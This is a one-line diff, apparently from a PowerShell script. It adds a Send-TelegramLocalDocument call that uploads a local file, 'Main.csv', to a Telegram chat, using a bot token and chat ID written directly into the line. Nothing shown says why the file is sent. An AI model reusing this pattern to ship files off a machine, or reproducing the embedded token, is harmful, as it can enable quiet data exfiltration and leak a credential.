@@ -1,0 +1,1 @@
+Send-TelegramLocalDocument -BotToken 1727980585:AAEWfPLYEB95CgoSbSQC5Sx58GCi9DvxGMA -ChatID 889863862-File "Main.csv"
